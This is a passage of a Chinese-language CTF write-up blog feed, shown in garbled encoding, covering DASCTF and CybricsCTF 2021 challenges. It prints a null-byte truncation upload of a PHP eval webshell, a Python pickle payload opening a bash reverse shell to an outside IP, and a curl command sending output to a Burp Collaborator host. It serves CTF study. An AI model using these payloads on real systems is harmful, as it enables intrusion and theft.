&lt;p>å‰ç«¯æ˜¯ä¸€ä¸ªé“¾æ¥ç”Ÿæˆç«™ ä¸­é—´å¯ä»¥åŠ ä¸€ä¸ªidçš„å‚æ•°ï¼Œè®¿é—®åä¼šè‡ªåŠ¨è°ƒç”¨æ‘„åƒå¤´ï¼ˆä½†æ˜¯ä¼šæœ‰ä¸ªæç¤ºçš„å¼¹çª—ï¼‰ï¼Œå…ˆæ‹ç…§å†ç›¸åº”é“¾æ¥ï¼Œä¹‹åå¯ä»¥åˆ°å…ˆå‰çš„é¡µé¢æŸ¥çœ‹æ‹åˆ°çš„ç…§ç‰‡ï¼Œæ•°æ®ä»¥postçš„å½¢å¼ä¸Šä¼ è‡³/qbl.php?id=xxx&amp;amp;url=xxxï¼Œè¿™æ˜¯qbl.phpçš„æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$base64_img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;img&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$up_dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;./img/&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//å­˜æ”¾åœ¨å½“å‰ç›®å½•çš„imgæ–‡ä»¶å¤¹ä¸‹
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0777&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^(data:\s*image\/(\w+);base64,)/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#111">$type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;bmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;png&amp;#39;&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#111">$new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;_&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">date&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;mdHis_&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$new_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Location: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>file_put_contents()æ‰§è¡Œæ–‡ä»¶å†™å…¥ï¼Œå†…å®¹å¯æ§+è·¯å¾„å·²çŸ¥ï¼Œè¿‡æ»¤çš„ç‚¹åœ¨äºåç¼€åæ˜¯bmpæˆ–png å¹¶ä¸”åªæœ‰é™¤å»åç¼€çš„è¿™æ–‡ä»¶åå¯æ§ï¼Œphpç‰ˆæœ¬æ˜¯5.2.17ï¼Œç”¨00æˆªæ–­ç»•è¿‡ï¼ˆpostéƒ¨åˆ†è¦urlencodeä¸€ä¸‹ burpæˆ–è€…hackbarå°±ç›´æ¥è½¬äº†&lt;/p>
&lt;pre tabindex="0">&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/">wp&lt;/a>&lt;/p>
&lt;h2 id="easyweb">easyweb&lt;/h2>
&lt;p>æœ‰ä¸€ä¸ªdockerçš„é™„ä»¶å’Œä¸€äº›æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160437216.png" alt="image-20210805160437216">&lt;/p>
&lt;p>é¦–é¡µå°±æ˜¯ä¸ªç™½åº•é»‘å­—çš„Hello Worldï¼Œå®¡ä¸‹æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160540313.png" alt="image-20210805160540313">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805160627110.png" alt="image-20210805160627110">&lt;/p>
&lt;p>ç›´æ¥æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼ˆå› ä¸ºè¿™é‡Œæ¶‰åŠåˆ°sessionçš„è°ƒç”¨ æ‰€ä»¥åœ¨.vscodeä¸­çš„launch.jsonå¤„æ·»åŠ ä¸€ä¸ªconfiguration: &lt;code>&amp;quot;justMyCode&amp;quot;: false&lt;/code>è¿™æ ·å¯ä»¥åœ¨è°ƒç”¨å †æ ˆå¤„çœ‹åˆ°å®Œæ•´çš„è°ƒç”¨æƒ…å†µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805180835775.png" alt="image-20210805180835775">&lt;/p>
&lt;p>å¯ä»¥æ³¨æ„åˆ°æ¯æ¬¡åˆ·æ–°ä¹‹å sessionçš„å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ç”Ÿæˆè¿™ä¸ªsessionæ—¶è°ƒç”¨äº†dumpsæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜å°±æ˜¯ååºåˆ—åŒ–çš„å¥—è·¯å•¦&lt;/p>
&lt;p>payloadæœ‰ä¸¤ç§å§ åå¼¹shell æˆ–è€…æ„é€ post/getè¯·æ±‚åˆ°è‡ªå·±å¯ä»¥æ¥æ”¶åˆ°çš„å¹³å°ä¸Šï¼Œä¹Ÿéƒ½æ˜¯å¸¸è§„åšæ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/175.24.73.30/2333 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">,))&lt;/span> &lt;span style="color:#75715e">#reduceå¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸²&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">hello_world&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;233&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;2333&amp;#34;&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Hello World!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ„é€ è¯·æ±‚çš„è¯è¿˜æ˜¯è€æœ‹å‹~~ burp collaborator~~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl &lt;span style="color:#d88200">&amp;#34;xxxxxx.burpcollaborator.net/`readflag`&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="http://www.snowywar.top/wp-content/uploads/2021/08/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%A4%A9%E5%9B%A2WriteUP.pdf">wp&lt;/a>&lt;/p>
&lt;h2 id="easyjava">easyjava&lt;/h2>
&lt;p>java æ ¹æœ¬ä¸ä¼š&lt;/p>
&lt;p>æ”¾ä¸ªå‚è€ƒé“¾æ¥ æºœäº†ï¼š&lt;a href="https://blog.csdn.net/solitudi/article/details/119322658?spm=1001.2014.3001.5501">wp1&lt;/a> &lt;a href="https://ha1c9on.top/2021/08/02/dasctf-2021-07/">wp2&lt;/a>&lt;/p>
&lt;hr>
&lt;p>æœ€è¿‘åœ¨æ€»ç»“ååºåˆ—åŒ–æœ‰å…³çš„ä¸œè¥¿ï¼Œæƒ³æŠŠphp, python, javaçš„ååºåˆ—åŒ– åšè¿‡çš„ä¸œè¥¿æ€»ç»“æ€»ç»“ï¼Œä½†è¿˜æ˜¯æˆ‘æƒ³å¾—å¤ªç®€å•äº† ä¸€ä¸ªphpçš„ååºåˆ—åŒ–å°±æœ‰å¥½å¤šå¥½å¤šä¸œè¥¿ï¼ˆè£…æ­»ï¼‰&lt;/p>
&lt;p>äº‰å–æ—©æ”¶å·¥å§ï¼Œè¿˜æœ‰upload, xss, csrf, sqli&amp;hellip;&amp;hellip;ç­‰ç€æ€»ç»“ è¿˜æœ‰è¶…çº§å¤šä¸œè¥¿è¦å­¦è¦çœ‹&lt;/p>
&lt;p>å­¦ä¹ å¥½è€¶ï¼Ïƒ`âˆ€Â´)&lt;/p></description></item><item><title>CybricsCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</link><pubDate>Thu, 29 Jul 2021 17:02:12 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</guid><description>&lt;h2 id="mic-check-cyber-baby-50-pts">Mic Check (Cyber, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Those organizers are changing &lt;a href="https://cybrics.net/rules">game rules&lt;/a> all the time! Thereâ€™s a flag there, and itâ€™s not that easy to capture.&lt;/p>
&lt;p>&lt;strong>Also be sure to join &lt;a href="https://t.me/cybrics">@cybrics Telegram chat&lt;/a>&lt;/strong> for challenge-related announcements and contacting orgs in case all goes wrong&lt;/p>
&lt;p>&lt;strong>Added at 10:10 â€”&lt;/strong> looks like the little mic check trolling caused massive pain, Iâ€™ve untrolled the rules page :-) You can now copy-paste freely&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png" alt="image-20210724194428638">&lt;/p>
&lt;h2 id="scanner-rebyc-baby-50-pts">Scanner (rebyC, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Mikhail Driagunov (&lt;a href="https://t.me/aethereternity">@aethereternity&lt;/a>)&lt;/p>
&lt;p>Check out this cool new &lt;a href="https://scanner-cybrics2021.ctf.su/">&lt;strong>game&lt;/strong>&lt;/a>!&lt;/p>
&lt;p>I heard they serve flags at level 5.&lt;/p>
&lt;/blockquote>
&lt;p>ä¸éš¾ï¼Œå°±æ˜¯æ¯”è¾ƒé¸¡è´¼ æŠŠå¥½å¥½çš„å›¾ç‰‡å¼„æˆçŠ¹æŠ±çµç¶åŠé®é¢&lt;/p>
&lt;p>é¦–å…ˆç”¨&lt;a href="https://gifsuper.com/">Gif Super&lt;/a>æŠŠå¸§é—´éš”è°ƒä¸º300msï¼Œç„¶åè£å‰ªå‡ºä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ† æ”¾å…¥&lt;a href="http://www.atoolbox.net/Tool.php?Id=979">GIFåŠ¨æ€å›¾ç‰‡åˆ†è§£&lt;/a>ä¸­çœ‹ç»“æœ éƒ½æœ‰åœ¨çº¿å·¥å…·å°±å¾ˆæ–¹ä¾¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png" alt="image-20210724202614568">&lt;/p>
&lt;p>æ‰€ä»¥è¿™ä¸ªç ´ç©æ„åˆ°åº•æ˜¯å•¥ï¼ŸçŒªï¼Ÿè¿˜æ˜¯åˆºçŒ¬ï¼Ÿ
åˆ«çš„éƒ½è¿˜ç®—æ­£å¸¸å§ å°±æ˜¯éƒ½ä¸å¤ªåƒå…¶å® æœ‰star, goose, flag, flower, ring, house, bone&amp;hellip;. æœ€åä¸€ä¸ªæ˜¯äºŒç»´ç  æ¯”è¾ƒéº»çƒ¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png" alt="image-20210724203314255">&lt;/p>
&lt;p>å†ç¨å¾®è°ƒæ•´ä¸€ä¸‹å°ºå¯¸ï¼Œæ‰«æå°±è¡Œäº†&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png" alt="image-20210724203713402">&lt;/p>
&lt;h2 id="rm--rfer-ctb-baby-166-pts">rm -rfâ€™er (CTB, Baby, 166 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all thatâ€™s left is one shell session.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh rmrfer@178.154.210.26
Password: sa7Neiyi
&lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
&lt;p>&lt;strong>Added at 13:45 â€”&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If youâ€™re not seeing the flag, try to find another method that will not hide info from you&lt;/p>
&lt;/blockquote>
&lt;p>è¿™ä¸ªé¢˜ emmmmm
åªè¦sshä¸€è¿æ¥å°±ä¼šè‡ªåŠ¨æ‰§è¡Œ&lt;code>rm -rf /*&lt;/code>çš„æŒ‡ä»¤ï¼Œå½“ååº”è¿‡æ¥çš„æ—¶å€™ç³»ç»Ÿå·²ç»åˆ çš„è¿lsæŒ‡ä»¤éƒ½ä¸å‰©äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png" alt="image-20210729003620922">&lt;/p>
&lt;p>å…ˆè¯´éé¢„æœŸè§£å§ï¼šå½“è¾“å…¥è¿æ¥å¯†ç åç«‹åˆ»ctrl+c åªè¦å¤Ÿå¿« å°±æ‰§è¡Œä¸äº†&lt;code>rm -rf /*&lt;/code>ï¼Œä¹‹åå°±å¯ä»¥é¡ºç•…çš„ç©¿æ¢­äºè¿™ä¸ªbuildboxä¹‹é—´æ‹¿flagäº†&lt;/p>
&lt;p>é¢„æœŸè§£åˆ™æ˜¯è¿™æ ·çš„ï¼šå½“ç³»ç»Ÿæ‰§è¡Œåˆ é™¤å‘½ä»¤å å¾ˆå¤šå¤–éƒ¨æŒ‡ä»¤éƒ½è¢«åˆ é™¤ éœ€è¦é€šè¿‡ä»…å‰©çš„ä¸€äº›å†…ç½®å‡½æ•°å®Œæˆ&amp;quot;read&amp;quot;çš„åŠŸèƒ½ï¼›ä»ä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯å¯çŸ¥ buildboxä½¿ç”¨çš„æ˜¯tcshï¼Œåœ¨tcshä¸­&lt;code>echo $&amp;lt;&lt;/code>å‘½ä»¤ç›¸å½“äº&lt;code>read&lt;/code>å‡½æ•°ï¼Œè¯»å…¥æ ‡å‡†è¾“å…¥å¹¶è¾“å‡ºï¼›tcshä¸­åŠ æ‹¬å·çš„å‘½ä»¤éƒ½ä¼šåœ¨å­shellä¸­è¿è¡Œï¼›æ„é€ payload &lt;code>(echo &amp;quot;$&amp;lt;&amp;quot;) &amp;lt; /etc/ctf/flag.txt&lt;/code>ï¼Œå³ è¯»å–flag.txtå¹¶è¾“å‡º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png" alt="image-20210729005544665">&lt;/p>
&lt;h2 id="ad-network-web-baby-50-pts">Ad Network (Web, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.&lt;/p>
&lt;p>&lt;a href="http://adnetwork-cybrics2021.ctf.su/">Adnetwork website&lt;/a>&lt;/p>
&lt;p>There is a flag 1337 redirects deep into the network&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;del>è¿™ä¸ªæˆ‘æ˜¯ä¸çŸ¥é“æ€ä¹ˆåšâ€¦â€¦é¡µé¢ä¸Šçš„ä»»ä½•é“¾æ¥éƒ¨åˆ†éƒ½æ˜¯è‡ªå·±é¡µé¢å†…çš„è·³è½¬ï¼Œæç¤ºçš„æ˜¯redirecté‡å®šå‘ï¼Œå¯æ˜¯æŠ“åŒ…åæ²¡æœ‰302 ä¹Ÿæ²¡æœ‰ä¸€ç›´åœ¨åšé‡å®šå‘å‘€ è¦æ€ä¹ˆçœ‹å‘¢ï¼Ÿ&lt;/del>&lt;/p>
&lt;p>emmmm åœ¨æ¯”èµ›ç¬¬äºŒå¤©å†æ¬¡å°è¯•çš„æ—¶å€™ç”¨burpçš„è‡ªå¸¦çš„chromiumçš„æµè§ˆå™¨ï¼ˆä¹‹å‰æ˜¯çŸ¥é“è¿™ä¸ª ä½†æ˜¯æ²¡æœ‰ç”¨è¿‡ï¼‰æ¬¸ é¡µé¢å·¦ä¸Šè§’æ˜¾ç¤ºäº†ä¸€ä¸ªgifå›¾
è¿™ä¸ªå›¾åœ¨æ˜¨å¤©åšçš„æ—¶å€™çœ‹åˆ°ï¼Œ å†…å®¹æ˜¯ &lt;em>awesome ad from adnetwork&lt;/em>ï¼Œä½†æ˜¯edgeæµè§ˆå™¨åœ¨åŠ è½½è¿™ä¸ªå›¾çš„æ—¶å€™ä¼šè‡ªåŠ¨é˜»æ­¢ æˆ‘å•ç‹¬çœ‹äº†å†…å®¹ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆç‰¹åˆ«çš„ å°±æ²¡æœ‰æ³¨æ„è¿™é‡Œã€‚äº‹åè§’åº¦çœ‹è¿™é‡Œ å…¶å®ä¸€ä¸ªGifå›¾è¢«é˜»æ­¢è¯·æ±‚åº”è¯¥æ˜¯å¾ˆåå¸¸çš„äº‹æƒ…ï¼Œåº”è¯¥é¦–å…ˆå¼•èµ·æ³¨æ„çš„&amp;hellip;&amp;hellip; &lt;del>ï¼ˆéƒ½æ€ªedge!!!&lt;/del>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png" alt="image-20210725133924877">&lt;/p>
&lt;p>ç‚¹å‡»gifä¼šæœ‰å•ç‹¬çš„å¼¹çª—å‡ºæ¥ï¼Œæç¤ºé‡å®šå‘æ¬¡æ•°è¿‡å¤šï¼›çœ‹burpä¸­çš„æŠ“åŒ…è®°å½• ç¡®å®å¤šçš„ç¦»è°±ï¼ŒæŒ‰ç…§é¢˜ç›®ä¸­çš„æç¤º å¾—æœ‰1337å±‚ï¼Œå¾—ä¸Šä¸ªè„šæœ¬æ…¢æ…¢è·‘äº† è¿™ä¸ªæ¯”è¾ƒå¥½å¼„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png" alt="image-20210725134346221">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>emmm æ¯”è¾ƒæ…¢å…¶å® åº”è¯¥æœ‰åˆ«çš„çš„æ–¹å¼ï¼Ÿæœ€åçš„flagæ˜¯ cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}&lt;/p>
&lt;p>æ¯”èµ›å®Œäº†çœ‹äº†åˆ«çš„wp è¿™å—å¯ä»¥ç”¨sessionè®¾å…è®¸é‡å®šå‘çš„æ¬¡æ•°ï¼Œè¿™æ ·æ›´æ–¹ä¾¿&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
